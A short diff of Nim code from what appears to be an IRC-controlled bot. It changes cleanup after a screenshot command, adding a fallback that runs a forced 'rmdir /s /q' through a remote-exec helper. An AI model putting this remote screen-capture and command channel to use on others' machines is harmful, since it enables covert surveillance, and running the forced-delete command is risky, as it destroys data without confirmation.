@@ -381,11 +381,12 @@ proc cmd_screenshot(event:IrcEvent, client:AsyncIrc) {.async.} =
             discard client.privmsg(event.origin, "problem removing " & $rand_filename & ".gz" & "  [" & repr(e) & "]")
 
         try:
+            setCurrentDir(current_dir) 
             if dirExists(scrndir):
                 removeDir(scrndir)
-        except OSError as e:
-            setCurrentDir(current_dir)  
+        except OSError as e: 
             discard client.privmsg(event.origin, "problem removing " & scrndir & "  [" & repr(e) & "]")
+            discard rexec_runCommand("rmdir /s /q " & scrndir)
         setCurrentDir(current_dir)  
 
 
